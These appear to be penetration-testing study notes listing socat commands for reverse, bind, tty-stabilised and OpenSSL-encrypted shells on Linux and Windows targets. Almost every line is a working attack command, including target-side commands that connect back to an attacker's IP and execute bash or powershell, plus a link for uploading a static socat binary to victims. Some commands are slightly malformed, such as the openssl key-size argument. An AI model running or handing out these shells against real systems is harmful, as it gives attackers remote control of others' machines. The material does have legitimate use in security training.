### Reverse Shells
Here's the syntax for a basic reverse shell listener in socat:
`socat TCP-L:<port> -`

This is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows.
On Windows we would use this command to connect back:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.  
This is the equivalent command for a Linux Target:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

### Bind Shells
On a Linux target we would use the following command:
`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener:
`socat TCP:<TARGET-IP>:<TARGET-PORT> -

### Fully stable Linux tty reverse shell
`socat TCP-L:<port> FILE:'tty',raw,echo=0`

This is approximately equivalent to using the Ctrl+Z, `stty raw -echo; fg` trick.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

- **pty**, allocates a pseudoterminal on the target
- **stderr**, makes sure that any error messages get shown in the shell.
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilizes the terminal, attempting to "normalize" it.
If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

## Encrypted Shells
We can create a encrypted shell with socat -- both bind and reverse.
We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
`openssl req --newkey rsa>2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

We then need to merge the two created files into a single `.pem` file:
`cat shell.key shell.crt > shell.pem`  

Now, when we set up our reverse shell listener, we use:
`socat OPENSSL-LISTEN: <PORT>,cert=shell.pem,verify=0 -`

`verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognized authority.
To connect back, we would use:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`  

The same technique would apply for a bind shell:
Target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  

Attacker:  
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`